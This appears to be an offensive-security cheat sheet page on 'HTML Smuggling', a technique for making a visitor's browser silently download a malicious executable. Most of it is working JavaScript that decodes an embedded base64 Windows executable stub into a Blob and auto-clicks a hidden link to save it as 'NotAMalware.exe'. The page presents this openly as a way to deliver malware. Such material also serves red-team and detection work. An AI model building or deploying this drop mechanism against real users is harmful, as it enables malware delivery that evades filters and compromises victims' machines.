# HTML Smuggling

## Summary

- [Description](#description)
- [Executable Storage](#executable-storage)


## Description

HTML Smuggling consists of making a user to navigate to our crafted HTML page which automaticaly download our malicious file.

## Executable storage

We can store our payload in a Blob object => JS: `var blob = new Blob([data], {type: 'octet/stream'});`
To perform the download, we need to create an Object Url => JS: `var url = window.URL.createObjectURL(blob);`
With those two elements, we can create with Javascript our \<a> tag which will be used to download our malicious file: 
```Javascript
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
```

To store ou payload, we use base64 encoding: 
```Javascript
function base64ToArrayBuffer(base64) {
	var binary_string = window.atob(base64);
	var len = binary_string.length;
	var bytes = new Uint8Array( len );
	for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
	return bytes.buffer;
}
     		
var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'NotAMalware.exe';
```